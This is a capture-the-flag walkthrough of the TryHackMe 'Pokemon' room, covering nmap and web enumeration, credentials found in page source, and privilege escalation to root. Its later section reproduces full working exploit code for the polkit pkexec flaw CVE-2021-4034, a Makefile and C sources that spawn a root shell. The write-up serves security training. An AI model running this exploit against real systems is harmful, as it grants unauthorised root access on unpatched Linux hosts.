## Link to tryhackme room

[Pokemon](https://tryhackme.com/room/https://tryhackme.com/room/pokemon)


## Save target IP to a variable (NOTE: Your IP will be different)

`
┌──(edward㉿repoman)-[~/Documents/tryhackme/pokemon]
└─$ export target="10.10.134.190"
`

## Scan for open ports

nmap options explained:  

- -Pn: Do not ping host(Assume it is alive)  
- -p-: Scan all TCP ports(1-65535)  
- -sS: SYN scan; Do not complete the TCP 3-Way handshake, only send SYN packet  
- -T4: Agressive scan  

`
┌──(edward㉿repoman)-[~/Documents/tryhackme/pokemon]
└─$ sudo nmap -Pn -p- -sS -T4 ${target}                                                                                                                                                                    1 ⚙
[sudo] password for edward: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-18 18:02 EDT
Nmap scan report for 10.10.134.190
Host is up (0.088s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 32.39 seconds
`

## Enumerate open ports

nmap options explained:

- -Pn: Do not ping host(Assume it is alive)  
- -p:  List of ports to scan  
- -sC: Run **C**ommand scripts against the selected ports  
- -sV: Display service **V**ersion  
- -oA: Save scan results in **A**ll formats(nmap, xml, greppable)  

`
┌──(edward㉿repoman)-[~/Documents/tryhackme/pokemon]
└─$ nmap -Pn -p22,80 -sC -sV ${target} -oA ${target}                                                                                                                                                       1 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-18 18:04 EDT
Nmap scan report for 10.10.134.190
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:14:75:69:1e:a9:59:5f:b2:3a:69:1c:6c:78:5c:27 (RSA)
|   256 23:f5:fb:e7:57:c2:a5:3e:c2:26:29:0e:74:db:37:c2 (ECDSA)
|_  256 f1:9b:b5:8a:b9:29:aa:b6:aa:a2:52:4a:6e:65:95:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Can You Find Them All?
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.00 seconds
`

## index.html

I ran dirb (dirb http://${target}) and nikto (nikto -h http://${target}) which didn't reveal anything interesting so I peeked at the index.html source, we find a interesting snippet of code  
This javascript code just displays a pokemon name from the randomPokemon array:  

`
<script type="text/javascript">
    	const randomPokemon = [
    		'Bulbasaur', 'Charmander', 'Squirtle',
    		'Snorlax',
    		'Zapdos',
    		'Mew',
    		'Charizard',
    		'Grimer',
    		'Metapod',
    		'Magikarp'
    	];
    	const original = randomPokemon.sort((pokemonName) => {
    		const [aLast] = pokemonName.split(', ');
    	});

    	console.log(original);
    </script>
`

I have to admit, I don't know anything about pokemon so I googled each pokemon to document the power of each.  I found one that matched the question for the first flag and when I submitted it, it was correct =)  

Another interesting set of lines in the index.html code is what looks to be user credentials in the format: : <username>:<password>  

`
REDCATED:REDACTED
        	<!--(Check console for extra surprise!)-->
`

## Gaining Access and water-type flag


I tried the credentials and indeed we have shell access now.  After gaining access, I downloaded and ran linpeas.sh and found two pieces of valuable information:
- /var/www/html/water-type.txt
	- Encoded with a cipher; try [Cyber Chef](https://cyberchef.org/) to decode (Hint: All Hail Caesar); This is our second flag
- `╔══════════╣ CVEs Check
   Vulnerable to CVE-2021-4034 `
	- Search this CVE in [Exploit Database](https://www.exploit-db.com/exploits/50689); We'll use this in a moment to escalate our privileges


## fire-type flag

Let's search the entire filesystem for any files containing the word "fire"  
`
pokemon@root:~$ find / -type f -iname *fire* 2> /dev/null
/var/lib/app-info/icons/ubuntu-xenial-main/64x64/firefox_firefox.png
/var/lib/app-info/icons/ubuntu-xenial-updates-main/64x64/firefox_firefox.png
/var/lib/app-info/icons/ubuntu-xenial-security-universe/64x64/firewall-config_firewall-config.png
/var/lib/app-info/icons/ubuntu-xenial-universe/64x64/firewall-config_firewall-config.png
/var/lib/app-info/icons/ubuntu-xenial-universe/64x64/fretsonfire-game_fretsonfire.png
/var/lib/app-info/icons/ubuntu-xenial-security-main/64x64/firefox_firefox.png
/var/lib/app-info/icons/ubuntu-xenial-updates-universe/64x64/firewall-config_firewall-config.png
/var/lib/dpkg/info/firefox.postrm
/var/lib/dpkg/info/firefox.list
/var/lib/dpkg/info/firefox-locale-en.list
/var/lib/dpkg/info/unity-scope-firefoxbookmarks.md5sums
/var/lib/dpkg/info/firefox.preinst
/var/lib/dpkg/info/firefox.md5sums
/var/lib/dpkg/info/unity-scope-firefoxbookmarks.list
/var/lib/dpkg/info/firefox.prerm
/var/lib/dpkg/info/firefox.conffiles
/var/lib/dpkg/info/firefox.postinst
/var/lib/dpkg/info/firefox-locale-en.md5sums
/etc/apport/blacklist.d/firefox
/etc/apport/native-origins.d/firefox
/etc/modprobe.d/blacklist-firewire.conf
**/etc/why_am_i_here?/fire-type.txt**
-- Omitted --
`

The flag is encoded...Again, head over to [Cyber Chef](https://cyberchef.org/) to decode


## CVE-2021-4034 (polkit)

The PolicyKit vulnerability found at [Exploit Database](https://www.exploit-db.com/exploits/50689) indicates we need to create three files and then run make to create our exploit  
Contents of Makefile:  
`
all:
	gcc -shared -o evil.so -fPIC evil-so.c
	gcc exploit.c -o exploit

clean:
	rm -r ./GCONV_PATH=. && rm -r ./evildir && rm exploit && rm evil.so
`
Contents of evil-so.c:  
`
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0);

    execve("/bin/sh", NULL, NULL);
}
`

Contents of exploit.c:  
`
#include <stdio.h>
#include <stdlib.h>

#define BIN "/usr/bin/pkexec"
#define DIR "evildir"
#define EVILSO "evil"

int main()
{
    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=ryaagard",
        "CHARSET=ryaagard",
        NULL
    };
    char *argv[] = { NULL };

    system("mkdir GCONV_PATH=.");
    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
    system("mkdir " DIR);
    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
    system("cp " EVILSO ".so " DIR);

    execve(BIN, argv, envp);

    return 0;
`

Now run make to create the exploit called "exploit" and run it with the following command: `./exploit`  


We now have root access.  

## Root flag
Check /home/roots-pokemon.txt to get the root flag  

And we're done

## Output that didn't help much in this case

### Directory brute-forcing with dirb

`
┌──(edward㉿repoman)-[~/Documents/tryhackme/pokemon]
└─$ dirb http://${target}                                                                                                                                                                            139 ⨯ 1 ⚙

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Sep 18 18:11:54 2022
URL_BASE: http://10.10.134.190/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.134.190/ ----
+ http://10.10.134.190/index.html (CODE:200|SIZE:11217)                                                                                                                                                       
+ http://10.10.134.190/server-status (CODE:403|SIZE:278)                                                                                                                                                      
                                                                                                                                                                                                              
-----------------
END_TIME: Sun Sep 18 18:18:47 2022
DOWNLOADED: 4612 - FOUND: 2
`

### Nikto Scan

`
┌──(edward㉿repoman)-[~/Documents/tryhackme/pokemon]
└─$ nikto -host 10.10.134.190                                                                                                                                                                              1 ⚙
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.134.190
+ Target Hostname:    10.10.134.190
+ Target Port:        80
+ Start Time:         2022-09-18 18:37:14 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2bd1, size: 5a8d8c0fe5140, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-09-18 18:49:21 (GMT-4) (727 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
`

